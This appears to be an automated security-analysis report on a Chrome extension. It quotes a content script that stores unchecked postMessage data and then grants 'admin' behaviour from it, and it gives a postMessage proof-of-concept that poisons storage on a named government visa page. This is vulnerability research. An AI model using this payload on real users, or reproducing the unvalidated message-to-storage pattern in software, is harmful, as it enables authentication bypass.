# CoCo Analysis: bgadpggjijchappldpnmkengeidolajg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bgadpggjijchappldpnmkengeidolajg/opgen_generated_files/cs_0.js
Line 467	window.addEventListener("message", function(event) {
Line 471	  if (event.data.type && (event.data.type == "FROM_PAGE_TO_CONTENT_SCRIPT")) {
Line 472		  chrome.storage.local.set({'key': event.data.text}, function() {});
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 467)
window.addEventListener("message", function(event) {
  if (event.source != window)
    return;

  if (event.data.type && (event.data.type == "FROM_PAGE_TO_CONTENT_SCRIPT")) {
    chrome.storage.local.set({'key': event.data.text}, function() {}); // ← attacker-controlled via event.data.text
  }
}, false);

// Content script - Storage retrieval (cs_0.js line 483-484)
chrome.storage.local.get(['key'], function(result) {
  if (result.key == "admin" || result.key == id) { // ← attacker-controlled value retrieved
    // DOM manipulation based on attacker-controlled value
    var css = document.createElement("link");
    css.rel = "stylesheet";
    css.onload = function() { css.onload = null; }
    document.getElementsByTagName("head")[0].appendChild(css);
    css.href = "https://www.jquery-az.com/javascript/alert/dist/sweetalert.css";
    // Further code execution follows...
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage to content script

**Attack:**

```javascript
// On webpage https://visa.mofa.gov.sa/Enjaz/PrintApplication*
// Attacker can inject this code to poison storage
window.postMessage({
  type: "FROM_PAGE_TO_CONTENT_SCRIPT",
  text: "admin" // ← Bypass authentication check
}, "*");

// The extension will:
// 1. Store "admin" in chrome.storage.local under key 'key'
// 2. Later retrieve this value and compare it with "admin" or id
// 3. Execute privileged functionality if match succeeds
```

**Impact:** Complete storage exploitation chain. Attacker on the target webpage can poison chrome.storage.local with arbitrary values, which are later retrieved and used in conditional logic that controls privileged extension functionality. By setting the value to "admin", the attacker can bypass authentication checks and trigger privileged DOM manipulation and script loading. This represents a storage-based authentication bypass vulnerability.
